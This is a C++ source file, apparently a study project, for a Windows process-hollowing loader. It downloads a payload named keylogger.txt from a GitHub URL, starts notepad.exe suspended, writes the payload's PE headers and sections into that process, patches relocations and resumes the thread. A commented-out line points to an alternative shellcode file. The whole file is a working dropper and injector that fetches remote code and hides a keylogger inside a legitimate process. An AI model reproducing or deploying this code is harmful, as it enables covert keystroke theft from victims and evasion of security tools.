#pragma comment(lib, "wininet")
#include<Windows.h>
#include<WinInet.h>

#include <fstream>

#include<iostream>

using namespace std;
#define RELOCTABLEOFFSET 0xA738
#define PAGEADDRESS 0x3A000
#define RELOCSIZE 8
typedef NTSTATUS(NTAPI* ntunmap)(
	HANDLE ProcessHandle,
	LPVOID  BaseAddress
	);
typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4; ;

}BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

DWORD down_file(PBYTE& pByte, DWORD size) {
	if (!InternetCheckConnectionA((LPCSTR)"https://www.google.com/", FLAG_ICC_FORCE_CONNECTION, 0)) {
		cout << "I need Internet\n";
		return NULL;
	}
	//LPCSTR  url = "https://github.com/A22H67/Study/raw/main/shellcode_exe.txt";
	LPCSTR  url = "https://github.com/A22H67/Study/raw/main/keylogger.txt"; 
	//tells the Internet DLL to initialize internal data structures
	//and prepare for future calls from the application
	HINTERNET internet_handle = InternetOpenA((LPCSTR)"Mozilla",
		INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
	if (!internet_handle) {
		cout << "Err InternetOpenA:" << GetLastError() << '\n';
		return NULL;

	}
	HINTERNET url_handle = InternetOpenUrlA(internet_handle, url, 0, 0,
		INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_AUTH, 0
	);
	if (!url_handle) {
		cout << "Err InternetOpenUrlA:" << GetLastError() << '\n';
		InternetCloseHandle(internet_handle);
		return NULL;
	}


	PBYTE byte = pByte;
	DWORD byteRead;
	int count = 0;

	while (1) {
		if (count >= size) {
			break;
		}

		memset(byte, 0, 1024);
		if (!InternetReadFile(url_handle, byte, 1024, &byteRead)) {
			cout << "count:" << count << '\n';
			cout << "Err InternetReadFile:" << GetLastError() << '\n';
			InternetCloseHandle(url_handle);
			InternetCloseHandle(internet_handle);
			return NULL;
		}
		if (byteRead == 0) {
			cout << "byteRead:" << byteRead << "  getlastErr:" << GetLastError() << '\n';
			break;
		}
		byte = (byte + byteRead);
		count += byteRead;
	}//end while


	InternetCloseHandle(url_handle);
	InternetCloseHandle(internet_handle);

	return 1;
}
int main() {
	//ofstream ost{ "D:\\zzz.exe",ios_base::binary };
	//if (!ost) cout << "can't open output file \n";
	
	DWORD size = 43008;
	BYTE* payload_byte = new BYTE[size + 1];
	if (!down_file(payload_byte, size)) {
		cout << "Err down file\n";
		return 0;
	}
	
	LPCSTR target_app = "c:\\windows\\syswow64\\notepad.exe";

	LPSTARTUPINFOA target_start_info = new STARTUPINFOA();
	LPPROCESS_INFORMATION target_process_information = new PROCESS_INFORMATION();
	if (!CreateProcessA(target_app, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL,
		target_start_info, target_process_information)) {
		cout << "Can't create process\n";
		return 1;
	}
	cout << "KeylogPID:" << target_process_information->dwProcessId << '\n';


	CONTEXT* context = LPCONTEXT(VirtualAlloc(NULL, sizeof(context), MEM_COMMIT, PAGE_READWRITE));;
	context->ContextFlags = CONTEXT_FULL;

	if (!GetThreadContext(target_process_information->hThread, context)) {
		cout << "Fail get context\n";
	}



	PIMAGE_DOS_HEADER payload_dos = (PIMAGE_DOS_HEADER)payload_byte;
	PIMAGE_NT_HEADERS payload_nt = (PIMAGE_NT_HEADERS)((DWORD)payload_byte + payload_dos->e_lfanew);
	DWORD sizeOfPayload = payload_nt->OptionalHeader.SizeOfImage;

	void* target_alloction_address = VirtualAllocEx(
		target_process_information->hProcess,
		NULL,
		sizeOfPayload,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	DWORD payload_image_base = payload_nt->OptionalHeader.ImageBase;
	payload_nt->OptionalHeader.ImageBase = (DWORD)target_alloction_address;


	//write  header
	WriteProcessMemory(target_process_information->hProcess,
		target_alloction_address,
		(LPCVOID)(DWORD)payload_byte,
		payload_nt->OptionalHeader.SizeOfHeaders,
		NULL);

	//write section header

	for (int i = 0; i < payload_nt->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER payload_section = (PIMAGE_SECTION_HEADER)((DWORD)payload_byte + payload_dos->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

		WriteProcessMemory(
			target_process_information->hProcess,
			(LPVOID)((DWORD)target_alloction_address + payload_section->VirtualAddress),
			(LPVOID)((DWORD)payload_byte + payload_section->PointerToRawData),
			payload_section->SizeOfRawData,
			NULL
		);
	}
	//relocation
	DWORD delta = (DWORD)target_alloction_address - payload_image_base;
	DWORD relocOffset = 0;
	PBASE_RELOCATION_ENTRY reloc_entry = (PBASE_RELOCATION_ENTRY)((DWORD)payload_byte + RELOCTABLEOFFSET);

	while (relocOffset < RELOCSIZE) {
		DWORD pathAddress = PAGEADDRESS + reloc_entry->Offset;
		DWORD patchBuffer = 0;
		ReadProcessMemory(target_process_information->hProcess,
			(PVOID)((DWORD)target_alloction_address + pathAddress),
			&patchBuffer,
			sizeof(DWORD),
			NULL
		);

		patchBuffer += delta;
		WriteProcessMemory(target_process_information->hProcess,
			(PVOID)((DWORD)target_alloction_address + pathAddress),
			&patchBuffer,
			sizeof(DWORD),
			NULL
		);

		reloc_entry = (PBASE_RELOCATION_ENTRY)((DWORD)reloc_entry + sizeof(WORD));
		relocOffset += 2;
	}

	WriteProcessMemory(target_process_information->hProcess,
		LPVOID(context->Ebx + 8),
		LPVOID(&payload_nt->OptionalHeader.ImageBase),
		sizeof(DWORD),
		NULL);

	context->Eax = (SIZE_T)((DWORD)target_alloction_address + payload_nt->OptionalHeader.AddressOfEntryPoint);//eax contain value of entry point
	SetThreadContext(target_process_information->hThread, context);
	ResumeThread(target_process_information->hThread);
	return 0;
}
